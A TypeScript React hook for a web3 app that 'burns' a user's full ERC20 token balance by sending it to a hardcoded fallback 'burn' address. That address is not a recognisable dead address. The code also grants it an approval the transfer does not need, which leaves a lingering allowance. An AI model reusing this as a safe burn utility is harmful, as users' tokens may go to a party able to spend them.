"use client";

import { useAccount, useWalletClient, usePublicClient } from "wagmi";
import { parseUnits } from "viem";
import { ERC20_ABI } from "@/utils/abis";

const BURN_ADDRESS = (process.env.NEXT_PUBLIC_BURN_ADDRESS ||
  "0x181a91f1be23c5ff16137f4b83fb38854f325395") as `0x${string}`;

interface Token {
  address: string;
  symbol: string;
  balance: string;
  decimals: number;
}

export function useBurnTokens() {
  const { address } = useAccount();
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  const burnToken = async (token: Token) => {
    if (!walletClient || !address || !publicClient) {
      throw new Error("Wallet not connected");
    }

    const amount = parseUnits(token.balance, token.decimals);

    // Check current allowance using publicClient
    const allowance = (await publicClient.readContract({
      address: token.address as `0x${string}`,
      abi: ERC20_ABI,
      functionName: "allowance",
      args: [address, BURN_ADDRESS],
    })) as bigint;

    // Approve if needed
    if (allowance < amount) {
      const approveHash = await walletClient.writeContract({
        address: token.address as `0x${string}`,
        abi: ERC20_ABI,
        functionName: "approve",
        args: [BURN_ADDRESS, amount],
      });
      await publicClient.waitForTransactionReceipt({ hash: approveHash });
    }

    // Transfer to burn address
    const transferHash = await walletClient.writeContract({
      address: token.address as `0x${string}`,
      abi: ERC20_ABI,
      functionName: "transfer",
      args: [BURN_ADDRESS, amount],
    });

    const receipt = await publicClient.waitForTransactionReceipt({
      hash: transferHash,
    });

    return receipt;
  };

  return { burnToken };
}

